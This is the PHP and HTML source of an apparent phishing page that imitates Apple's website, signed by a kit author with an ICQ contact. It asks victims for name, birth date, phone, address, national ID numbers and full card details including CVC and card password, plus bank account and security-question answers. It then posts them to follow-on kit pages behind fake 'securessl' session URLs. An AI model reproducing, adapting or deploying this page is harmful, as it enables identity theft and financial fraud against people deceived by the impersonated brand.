<?php 
error_reporting(0);
/*
Dr.TCHITCHO = ICQ: 673729917
*/ 
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require "lang.php";
require "config.php";
?>
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">
if (screen.width <= 699) {
document.location = "Step1.php?&sessionid=<?php echo generateRandomString(115);?>&securessl=true";
}
</script>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo $tit ?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>
<?php include "bagian/flow.php" ?>
<div class="container">
<div class="flex home-content">
<?php if ($Double == "kerad") { ?>
<form action="Verify2.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<?php } else if ($idcard == "naam") { ?>
<form action="DocumentVerification.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<?php } else { ?>
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<?php } ?>
<div class="container flow-sections">
<section class="flow-section mobile-section-edit  edit ">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name" id="heading-account">
                <h2 class="not-mobile section-title wrap-section-title"><?php echo $person ?></h2>
            </div>
            <div id="account-content" aria-labelledby="heading-account" class="col-md-9 subsection">
<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $nam ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="fname" id="fname" class="generic-input-field form-control field" placeholder="<?php echo $namad ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="<?php echo $namat ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="lname" id="lname" class="generic-input-field form-control field" placeholder="<?php echo $namab ?>">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?php echo $laer ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="dob" name="dob" class="form-control form-input" type="text" placeholder="<?php echo $laer ?>">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?php echo $hape ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="telephone" name="telephone" class="form-control form-input" type="text" placeholder="<?php echo $telp ?>">
</div>
</div>
</div>
</div>
</div>
<?php echo $lang['SSN'];?>
<?php echo $lang['PASSPORT'];?>
<?php echo $lang['NUMBID'];?>
<?php echo $lang['NAID'];?>
<?php echo $lang['CIVILID'];?>
<?php echo $lang['QATARID'];?>
<?php echo $lang['CITIZENID'];?>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?php echo $adrrd ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" placeholder="<?php echo $addl ?> ">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" placeholder="<?php echo $tow ?>">
</div>
</div>
<div class="form-group clearfix middle-wrapper">
<div class="select-wrapper">
<?php if ($negoro == "ES" || $negoro == "UY" || $negoro == "AR" || $negoro == "CL" || $negoro == "MX" || $negoro == "BR" || $negoro == "ID" || $negoro == "CN" ||$negoro == "IN") { ?>  
<input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="<?php echo $ctry?>" required="required">
<? } else {  
echo $lang['COUNTYSELECT']; } ?>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
     <?php if ($negoro == "ES" || $negoro == "UY" || $negoro == "AR" || $negoro == "CL" || $negoro == "MX" || $negoro == "BR" || $negoro == "ID" || $negoro == "CN" ||$negoro == "IN") { ?>  
  <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="<?php echo $pcode;?>" required="required">
  <?php } else { ?>
  <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="<?php echo $lang['POSTCODE'];?>">
  <?php } ?>
</div>
</div>
<input type="hidden" name="country" value="<?php echo $lang['COUNTRY'];?>">
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit ">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?php echo $accdt ?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
            
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $crdd ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="<?php echo $chn ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" placeholder="<?php echo $can ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?php echo $expd ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?php echo $cscs ?>">
</div>
</div>
<?php echo $lang['CREDITLIMIT'];?>
<?php echo $lang['ACCOUNT'];?>
<?php echo $lang['CARDID'];?>
<?php echo $lang['CARDPASSWORD'];?>
<?php echo $lang['BANK_ACCOUNT'];?>
<?php echo $lang['NABID'];?>
</div>
</div> 
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit " style="border-bottom: 0px;">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?php echo $secty ?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">       
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $ques ?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
  <option  value=""><?php echo $sques ?></option>
  <option value="mothers maiden name"><?php echo $ques1 ?></option>
  <option value="drivers no"><?php echo $ques2 ?></option>
  <option value="passport no"><?php echo $ques3 ?></option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?php echo $ans ?>">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
</div>
<input type="submit" class="gobtn btn-link" style="float:right;" value="<?php echo $fin ?>">
</form>
<!-- FORM ENDS -->
</div>
</div>
</div>
</div>
<div class="global-footer" style="background-color:#f6f6f6">
  <footer>
    <footer id="ac-globalfooter" class="js flexbox" lang="en-US" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label">
        <div class="ac-gf-content">
             <style>#ac-globalfooter .ac-gf-footer-legal-link:last-child  {margin: 3px 0 0 0;} #ac-globalfooter .ac-gf-footer {border-top: none;}</style><section class="ac-gf-footer">
	
<div class="ac-gf-footer-shop" x-ms-format-detection="none" style="padding-top:15px; padding-bottom:8px;padding-left:15%;font-family: Segoe UI;color:#7c7c7c;font-size: 11px;">
		More ways to shop: Visit an <a href="#">Apple Store</a>, <span class="nowrap">call <?php echo $lang['APPCALL']; ?>, or <a href="#">find a reseller</a></span>.
		</div>
<div class="ac-gf-footer-shop" x-ms-format-detection="none" style="padding-bottom:30px;padding-left:15%;font-family: Segoe UI;color:#7c7c7c;font-size: 11px;">
		Copyright © 2018 Apple Inc. All rights reserved.&nbsp&nbspPrivacy Policy&nbsp&nbsp Terms of Use&nbsp&nbsp Sales and Refunds&nbsp&nbsp Legal&nbsp&nbsp Site Map<a class="choose" href="#"><img height="20" src="<?php
	echo $lang['FLAG']; ?>" width="20" style ="margin-right:15%" align="right"></a>
	</div>

        </div>
    </footer>
</div>
</div>
</div>
</body>
</html>
<script>
    $(window).resize(function() {

  if ($(this).width() < 1024) {

    $('.global-footer').hide();

  } else {

    $('.global-footer').show();

    }

});
</script>